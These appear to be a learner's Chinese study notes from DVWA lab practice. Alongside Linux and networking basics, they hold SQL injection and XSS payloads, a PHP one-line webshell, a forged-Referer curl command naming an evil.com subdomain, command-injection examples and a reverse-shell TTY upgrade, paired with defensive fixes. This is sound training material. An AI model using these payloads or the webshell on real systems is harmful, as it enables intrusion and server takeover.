## 一、环境配置与工具

### 1.1 Firefox 配了代理，Burp 却抓不到包

**我问的**：配置浏览器代理在哪里？

**现象**：Connection Settings 里选了 Manual proxy configuration，HTTP Proxy 填 `127.0.0.1:8080`，但 Burp 里空无一物。

**原因**：Firefox 那行小字——

> Connections to **localhost, 127.0.0.1/8, and ::1** are never proxied.

**Firefox 永远不代理本机地址**。你在 Kali 里用 `127.0.0.1` 访问 DVWA，流量会绕过代理。

**正确做法**：

| 方式 | 地址 |
|---|---|
| 浏览器和 Burp 在同一台机（Kali） | `http://127.0.0.1:8080` + 访问 `192.168.59.128/DVWA/`（真实网卡 IP，不是本机字面量） |
| Windows 浏览器借 Kali 的 Burp | Burp 改监听 **All interfaces**，Windows 代理填 `192.168.59.128:8080` |

**记住**：**代理配置对了 ≠ 流量会走代理**。判断标准只有一个——**Burp 里出现请求**。

---

### 1.2 `sudo /var/log/auth.log` 报错

**原因**：`sudo` 后面必须跟**命令**，不能跟文件。

```bash
sudo cat /var/log/auth.log     # 对
sudo /var/log/auth.log         # 错
```

**记住**：`sudo` 是「以 root 身份执行后面这条命令」。

---

### 1.3 Kali 里没有 `/var/log/auth.log`

**原因**：Kali 用 systemd + journald，没有 Ubuntu 那套 `auth.log` / `syslog`。

```bash
sudo journalctl -u ssh -n 20                # 某个服务最近 20 条
sudo journalctl --since "10 min ago"        # 最近 10 分钟所有日志
sudo journalctl -f                          # 实时跟
```

**记住**：**Kali 的日志入口是 `journalctl`**，`/var/log/` 下面只有少数几个文件。

---

### 1.4 时区一直是 UTC/EDT，日志时间对不上

**现象**：日志里显示的时间比北京时间慢，排查问题时判断错误。

```bash
timedatectl set-timezone Asia/Shanghai
timedatectl                                  # 确认 Time zone
```

**记住**：**看日志前先确认时区**，否则时间线全是错的。

---

### 1.5 Burp 里看不到请求 / 找不到带有 token 的请求

**原因 1**：Intercept 还开着，请求被拦在 Proxy 里，没进 HTTP history。

**原因 2**：没有真的提交过一次——比如 CSRF 高难度的请求，必须先点一次网页上的 Change。

**正确流程**：Proxy → **HTTP history** → 找到请求 → **右键 → Send to Repeater**（或 `Ctrl+R`）。

**记住**：**先放行，再找历史**。

---

### 1.6 Repeater 里请求和响应不在一屏

**位置**：Request/Response 标签行最右边有两个方块图标，点一下 = 左右并排，再点 = 上下堆叠。

**截图技巧**：并排一屏就能同时看到「我改了什么」和「服务器返回什么」。

---

### 1.7 302 Found 是失败还是成功？

**看响应码**：

| 返回 | 含义 |
|---|---|
| `200 OK` + HTML | 操作**成功**（比如 Password Changed.） |
| `302 Found` + `Location: index.php` + `Content-Length: 0` | 被**拒绝**，重定向回去 |

**怎么看到真正原因**：Repeater 里打开 **Follow redirects**，跟随跳转后就能看到 `CSRF token is incorrect` 这类提示。

**记住**：**302 不是"服务器出错了"，而是"服务器不让这次请求通过"**。

## 二、Linux

### 2.1 `ps aux` 和 `ps -ef` 有什么区别

| | `ps aux` | `ps -ef` |
|---|---|---|
| 风格 | BSD | System V |
| 有 PPID 吗 | **没有** | **有** |
| 可读性 | `%CPU` `%MEM` 更直观 | 列名更规整 |

**记住**：**需要看"谁启动了谁"就用 `ps -ef`**（有 PPID）。

---

### 2.2 grep 把自己也 grep 出来了

```bash
ps aux | grep ssh            # 会多出一条 grep ssh
ps aux | grep ssh | grep -v grep   # 去掉
```

---

### 2.3 为什么先 `kill -15` 后 `kill -9`

| 信号 | 名字 | 行为 |
|---|---|---|
| 15（默认） | SIGTERM | "请你退出"——进程能保存数据、关连接、清理临时文件 |
| 9 | SIGKILL | 内核直接干掉，**不可忽略、来不及收尾** |

**记住**：**先 15 后 9 是职业习惯**。9 是最后手段。

---

### 2.4 `kill %2` 和 `kill 1234` 的区别

- `kill %2`：按**任务号**杀，只在**当前 shell** 里有效
- `kill 1234`：按 **PID** 杀，全局唯一

**记住**：`jobs -l` 能同时看到任务号和 PID，三个同名进程分不清时用它。

---

### 2.5 `jobs` 看不到另一个终端起的进程

**原因**：`jobs` 只显示**当前 shell** 起的任务。

**记住**：跨终端用 `pgrep -a 名字` 或 `ps aux | grep`。

---

### 2.6 端口开放 ≠ 端口暴露（本课程最重要的一条）

```bash
ss -tlnp
```

```
LISTEN 0 80  127.0.0.1:3306     ← 只有本机能连，风险低
LISTEN 0 511 *:80               ← 绑在网卡上，同网段任何主机都能连，风险高
```

**`*` 等价于 `0.0.0.0`**，是双栈 socket，IPv4 和 IPv6 都收。

**记住**：**判断风险看"监听地址"，不是看"端口开没开"。**

---

### 2.7 `sudo` 后看不到别人进程的名字

`ss -tlnp` 不加 `sudo` 只能看到**自己用户**的进程名，加 `sudo` 才是全部。

---

### 2.8 `netstat` 在 Kali 上不存在

Kali 默认不装 net-tools，用 `ss` 代替。

| 老命令 | 新命令 |
|---|---|
| `netstat -tlnp` | `ss -tlnp` |
| `netstat -an` | `ss -an` |
| `arp -a` | `ip neigh` |
| `ifconfig` | `ip a` |
| `route -n` | `ip route` |

## 三、网络

### 3.1 为什么两次握手不行

**答案**：两次只能确认"客户端能发、服务端能收"，**无法确认"客户端能收"**。

更要命的是：**历史上失效的重复连接请求**会突然到达服务端，服务端以为是新连接，直接分配资源空等——**三次握手就是为了挡住这种包**。

**面试标准答法**：三次握手让双方都确认了「我的发送能力」和「对方的接收能力」都正常，同时避免历史失效连接请求浪费资源。

---

### 3.2 为什么四次挥手

**因为 TCP 是全双工的**，两个方向要分别关闭。客户端说"我不发了"（FIN），不代表服务端也"不发了"——服务端可能还有数据要传完，所以中间要分开两次。

---

### 3.3 `127.0.0.1` 和 `0.0.0.0` 有什么区别

- `127.0.0.1`：**只有本机能访问**
- `0.0.0.0`：**监听所有网卡**，同网段/公网都能访问

DVWA 实战里的 3306（只监听本机）和 80（监听 `*`）就是这个区别。

---

### 3.4 `192.168.x.x` 是什么意思

**私有地址**，是占位符，每台机器上可能不同。你的是 `192.168.59.x`，别的教程里写 `192.168.1.x` 都是同一个意思。

---

### 3.5 `ping 193.168.59.2` 不通 / `nmap -sn 192168.59.0/24` 报错

**都是打错字**：

- `193` 应为 `192`
- `192168.59.0/24` 少了点，应为 `192.168.59.0/24`

**记住**：**IP 地址少一个点、错一个数字，命令就废**。报错先检查输入。

---

### 3.6 跨网段时 ARP 问的是谁

**问网关的 MAC，不是目标服务器的。**

链路层只负责"送到下一跳"。同网段才直接问对方 MAC。

---

### 3.7 抓 HTTPS 只能看到密文

**这是正常的**，不是你抓错了。TLS 在 TCP 和 HTTP 之间加了一层加密，Wireshark 只能看到加密后的流量——**这正是 HTTPS 保护的东西**。

---

## 四、Web 漏洞

### 4.1 SQL 注入：`1,2` 是谁的数据

`1' union select 1,2 #` 里那两列**是你自己写进去的字面量**，不是数据库的数据。

它们的作用：**union 要求前后列数一致**，所以给两个值占位；页面**显示出哪个数字**，那一列就是回显位。

**注意**：`order by 2 #` 里出现的 `2` 是**列序号**，不是"第二列的内容"。

---

### 4.2 SQL 注入：先判断列数还是先判断回显

**顺序**：① 单引号确认注入点 → ② `order by N` 判断列数 → ③ `union select 1,2,... ` 找回显位 → ④ `union select database(),user()` 取数据。

**我之前的问题**：只记得 ① 和 ④，中间的 ②③ 说不出。

**记住**：**`1' or '1'='1` 是"验证存在"，不是"利用"**。面试可能问"你说只能登录，那怎么拿出数据库里的数据？"——那就得往下走②③④。

---

### 4.3 `@` 前面的是谁的用户名

`dvwa@localhost` 的 `dvwa` 是**目标机上数据库的用户名**，不是你的 Windows 用户名，也不是 Kali 用户名。

---

### 4.4 XSS：为什么 payload 在 `<option>` 里不执行

**因为注入上下文不对**：

| 插入位置 | 能否执行 |
|---|---|
| 标签之间（`<div>这里</div>`） | **能** |
| 属性值里（`value="这里"`） | 通常不能 |
| `<option>` 容器内 | **不能**（浏览器会丢弃非法子元素） |

**绕过**：先闭合容器，再注入

```html
</option></select><script>alert(1)</script>
```

**记住**：**先看回显落在哪个上下文，再决定用哪种闭合方式**。

---

### 4.5 XSS：F12 里为什么 value 是编码的、文本是解码的

看 DOM 型源码：

```javascript
document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
```

- `value` 属性直接用了 `lang` → 保持 `%3C...` 编码 → **死**
- 文本部分用了 `decodeURI(lang)` → 解码回 `<` → **活**

**记住**：**"编码的地方"通常不执行，"解码的地方"才有机会执行。**

---

### 4.6 文件上传：Medium 改 Content-Type 为什么能过

Medium 只检查前端传来的 `Content-Type`，不检查文件真实内容。

Burp 拦截请求，把：

```
Content-Type: application/x-php
```

改成：

```
Content-Type: image/jpeg
```

**记住**：**所有来自客户端的字段都可以伪造**，包括 Content-Type、文件名后缀。

---

### 4.7 一句话木马里的 `cmd` 是谁起的名字

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

**`cmd` 是代码写死的参数名**，攻击者 **只控制值，不控制名**。

访问方式：

```
/shell.php?cmd=whoami
```

---

### 4.8 越权：水平和垂直的区别

| 类型 | 定义 | 例子 |
|---|---|---|
| 水平越权 | 同级用户互相访问 | 改 `id=1` 看别人的订单 |
| 垂直越权 | 低权限做高权限的事 | 未登录 / 普通用户访问 admin 页面 |

**防御**：**服务端每次请求都要校验权限**。前端隐藏按钮不是防御。

---

### 4.9 前端校验等于没有校验

改了页面就能绕过。**任何"只在浏览器里发生"的校验，都不能算安全措施。**

## 五、CSRF

### 5.1 CSRF 为什么不需要知道密码

**答对的核心**：浏览器会自动带上 Cookie，服务端只认 Cookie，不认"是不是本人点的"。

**CSRF 的前提是"受害者已登录"**。攻击者不需要登录，他只需要让受害者的浏览器发请求。

---

### 5.2 Referer 为什么会等于 `evil.com`

**Referer = 上一个页面的地址**，浏览器自动加。三种值分别对应：

| 值 | 对应场景 | 谁生成的 |
|---|---|---|
| `http://192.168.59.128/csrf.html` | 恶意页面在目标同机 | 浏览器**真实生成** |
| `http://evil.com/` | 攻击者外部站点 | **Burp 手动敲**（模拟） |
| `http://192.168.59.128.evil.com/` | 攻击者注册的子域名 | **Burp 手动敲**（模拟） |

**为什么可以手动敲**：Referer 就是一个普通 HTTP 头，客户端想写什么就写什么。

---

### 5.3 为什么 Referer 不是有效防御（我的原答案不准确）

**我当时的答案**："Referer 是攻击者知道的，Token 攻击者不知道。"

**更准确的说法**：**Referer 是"可控、可构造"的。**

- 浏览器可以配置成不发 Referer
- Burp / curl 可以随意改写
- 攻击者可以注册含目标域名的子域名

```bash
curl -H "Referer: http://192.168.59.128.evil.com/" "http://192.168.59.128/DVWA/vulnerabilities/csrf/?..."
```

**记住**：**一个由客户端提供的值，不能用来证明客户端的身份。**

---

### 5.4 Medium 的漏洞到底是什么

源码：

```php
if ( stripos( $_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME'] ) !== false ) {
```

**`stripos` 是"查找子串"，不是"等于"。**

只要 Referer 里**任意位置**出现服务器名就算通过，所以：

```
192.168.59.128.evil.com          ← 子域名
evil.com/192.168.59.128/         ← 路径
evil.com/?x=192.168.59.128       ← 参数
```

**三种都能通过。**

**正确的写法**至少是解析出 host 再全等比较：

```php
$referer = parse_url( $_SERVER['HTTP_REFERER'], PHP_URL_HOST );
if ( $referer === $_SERVER['SERVER_NAME'] ) { ... }
```

---

### 5.5 CSRF High：302 是不是失败

**是失败。**

```
HTTP/1.1 302 Found
Location: index.php
Content-Length: 0
```

打开 **Follow redirects** 后看到：

```html
<div class="message">CSRF token is incorrect</div>
```

**结论**：token 错 / 过期 / 已被消耗，都会 302 跳回。

---

### 5.6 CSRF Token 为什么有效

| 特点 | 作用 |
|---|---|
| **随机** | 每次刷新都不一样，攻击者猜不到 |
| **存服务端 Session** | 客户端只有一份副本 |
| **一次性** | 用过即作废，重放失败 |

**攻击者为什么拿不到**：他的页面在 `evil.com`，**读不到** `192.168.59.128` 页面里的 HTML（**同源策略**）。

---

### 5.7 SameSite=Lax 到底挡住什么

- `Lax`：跨站发起的 POST、`<img>`、`<iframe>` 请求**不带 Cookie**
- `Strict`：更严，从外部链接点进来都不带

**但要说清**：这是**浏览器帮你挡**，不是**网站自己的防御**。网站不能指望用户的浏览器版本。

## 六、命令执行

### 6.1 `;` 和 `&&` 的区别（我答错了）

**我当时的答案**："一次执行，前一个执行后面的才执行"——把两个混在一起了。

| 连接符 | 规则 | 例子 |
|---|---|---|
| `;` | **不管前面成不成功**，后面都执行 | `ping 无效IP; whoami` → whoami **照样执行** |
| `&&` | **前面成功才执行**后面 | `ping 无效IP && whoami` → whoami **不执行** |
| `\|\|` | 前面**失败**才执行 | 补丁 |
| `\|` | 管道 | 前一条输出给后一条 |
| `&` | 放后台 | 都执行 |

**记忆口诀**：`&&` 读作"**而且**"（有条件），`;` 读作"**然后**"（无条件）。

---

### 6.2 命令执行和 SQL 注入的共同点

**我答对了方向**："都把用户输入放进语句当中。"

**更准确的说法**：

| | SQL 注入 | 命令注入 |
|---|---|---|
| 输入被当成了 | SQL 代码 | shell 命令 |
| 分隔符 | `'` `#` `--` | `;` `&&` `\|` `&` |
| 本质 | **数据变成了代码** | **数据变成了代码** |

**一句话**：**程序没把"数据"和"代码"分开。**

---

### 6.3 High 为什么还能绕过（我答对了）

**我当时的答案**：光禁用 `"| "`，没禁用 `"|"`，黑名单永远禁用不全。

**再补一句才满分**：黑名单的**根本问题**是"你必须列全所有危险字符，而攻击者只需要找到一个漏网的"。

---

### 6.4 拿到 www-data 后第一件事（我答"不知道"）

**不是找 flag，不是提权。**

先做三件事：

```bash
whoami      # 我是谁
id          # 有什么权限
pwd         # 我在哪
```

**为什么不是直接提权**：

1. **先确认 shell 真的能操作**（有时回显假成功）
2. **先判断值不值得深挖**（如果什么都读不了，换方向）
3. **先保证 shell 稳定**——升级成完整 TTY：

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**面试标准答法**：

> 先做身份确认和终端加固——whoami、id、pwd，然后用 python3 升级成完整 TTY。之后才是找配置文件、找凭据、看能不能提权。顺序不能乱，因为 shell 不稳定的话后面所有操作都会断。

---

### 6.5 怎么修 High（我答"不知道"）

**错的修法**（90% 的人会这么答）：补齐黑名单。

```php
$substitutions = array( '|' => '', '&' => '', ';' => '', ... );  // 永远补不完
```

**正确的修法，按优先级**：

**A. 不拼命令 + 转义**

```php
$ip = filter_var($_POST['ip'], FILTER_VALIDATE_IP);
if ($ip === false) die('invalid IP');
$result = exec("ping -c 4 " . escapeshellarg($ip));
```

**`escapeshellarg()` 做了什么**：把参数整体当成一个字符串，用单引号包起来，内部单引号转义。

```bash
ping -c 4 '127.0.0.1; whoami'     # 整串被当成一个主机名，; 不再是分隔符
```

**B. 白名单 + 转义（两层）**

先 `filter_var(..., FILTER_VALIDATE_IP)` 验证格式，再 `escapeshellarg` 转义。

**C. 工程上最彻底**

- `disable_functions = exec,system,shell_exec,passthru,proc_open`
- Web 服务以低权限运行
- 改用 API 或库，不调用 shell

**记住**：**黑名单只能提高门槛，不能解决问题。**

---

### 6.6 反弹 shell 那两行红色警告是什么

```
bash: cannot set terminal process group (1159): Inappropriate ioctl for device
bash: no job control in this shell
```

**不是报错。** `bash -i` 申请交互式终端，但 TCP 连接没有 TTY，所以 `ioctl` 失败。

**判断成功的唯一标准**：提示符变成

```
www-data@kali:/var/www/html/DVWA/vulnerabilities/exec$
```

---

### 6.7 DVWA 的 ping 结果和注入结果一起返回

`127.0.0.1; bash -c "..."` 先执行 ping（跑 4 秒），再执行反弹。

**坑**：**payload 写错了，ping 依然会成功返回**。很多人误以为"成功了"。

**判断标准永远是反弹端的 nc 窗口**，不是浏览器页面。

---

### 6.8 输入框太窄，payload 显示不全

Input 用了 `size="15"`，**宽度写死，不随页面缩放**。

**两个办法**：

1. 输出两行：`127.0.0.1|whoami`（短）用于 High 的演示
2. 拍两张图：一张浏览器地址栏粘完整 payload，一张 nc 窗口结果

## 七、学习与心态

### 7.1 "跟着做会，独立做不会"

**原因**：跟着视频时，你在**执行**；独立做题时，你在**回忆**。这两种能力用的不是同一个记忆回路。

**对策**：**每天闭卷 5 个关键词**，说不出来的就是真没学会。

---

### 7.2 焦虑、怕找不到工作、怕进厂

- 焦虑占用认知带宽，不是懒
- HR 昨天活跃今天不活跃，不是针对你
- 乙方的安服 / 驻场 / 等保是**全年滚动招**，不只 9 月和 3 月
- 启动法：**每天 3 件事 × 15 分钟**

---

### 7.3 7 小时的计划，2–3 小时就做完了

**说明计划里塞了太多"看"的部分**。有效工时 ≠ 课时长。

**改法**：**3 小时硬任务 + 至少 1 小时闭卷**。闭卷时间不算"额外"，算在 4 小时之内。

---

### 7.4 闭卷测试答不出来，正常吗

**正常。** 10/28 我做过一次闭卷测，你只想起两个验证用的 payload。

这不是"没学会"，是"没练过独立提取"。**闭卷本身就是要练的东西**，不是测试你行不行。
